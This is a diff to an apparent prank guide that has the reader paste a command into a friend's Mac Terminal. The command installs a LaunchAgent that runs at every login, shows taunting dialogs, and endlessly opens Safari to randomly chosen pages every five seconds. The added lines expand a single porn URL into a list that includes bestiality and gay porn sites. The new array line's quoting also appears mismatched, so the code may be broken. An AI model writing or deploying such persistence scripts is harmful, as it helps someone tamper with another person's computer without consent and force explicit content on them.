@@ -16,6 +16,8 @@ Setting Up the Prank
 Open Terminal on your friend's Mac
 Copy and paste this entire command:
 ```
+#!/bin/bash
+
 cat > ~/Library/LaunchAgents/com.friend.prank.plist << 'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -27,7 +29,7 @@ cat > ~/Library/LaunchAgents/com.friend.prank.plist << 'EOF'
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>osascript -e "display dialog \"So I heard you like to draw things in notebooks...\" buttons {\"Who is this?\"} default button 1 with title \"Hello Friend\"" && osascript -e "display dialog \"Your artistic talents have been noted. And so has your habit of opening certain websites on my computer.\" buttons {\"Oh...\"} default button 1 with title \"About Your Hobbies\"" && osascript -e "display dialog \"What goes around comes around, my friend.\" buttons {\"Wait what?\"} default button 1 with title \"Fair Warning\"" && osascript -e "display dialog \"Hope you enjoy closing all these tabs as much as I enjoyed finding your browser history on my computer.\" buttons {\"I deserve this\"} default button 1 with title \"Sweet Revenge\"" && while true; do open -a Safari https://www.icegay.tv/categories && sleep 5; done</string>
+        <string>osascript -e "display dialog \"So I heard you like to draw things in notebooks...\" buttons {\"Who is this?\"} default button 1 with title \"Hello Friend\"" && osascript -e "display dialog \"Your artistic talents have been noted. And so has your habit of opening certain websites on my computer.\" buttons {\"Oh...\"} default button 1 with title \"About Your Hobbies\"" && osascript -e "display dialog \"What goes around comes around, my friend.\" buttons {\"Wait what?\"} default button 1 with title \"Fair Warning\"" && osascript -e "display dialog \"Hope you enjoy closing all these tabs as much as I enjoyed finding your browser history on my computer.\" buttons {\"I deserve this\"} default button 1 with title \"Sweet Revenge\"" && while true; do websites=(\"https://sexmix.net/horse-sex/" \"https://www.icegay.tv/categories" \"https://i.guim.co.uk/img/media/b1c1caa029d6f186f9d6b3fabb7f02517eb9c33b/0_58_2528_1519/master/2528.jpg?width=1200&height=900&quality=85&auto=format&fit=crop&s=22aae08708a226561bcdc42856a2bb18" \"https://www.quora.com/How-can-I-end-my-addiction-to-Roblox" \"https://en.wikipedia.org/wiki/Skibidi_Toilet"); random_site=${websites[$RANDOM % ${#websites[@]}]}; open -a Safari "$random_site"; sleep 5; done</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
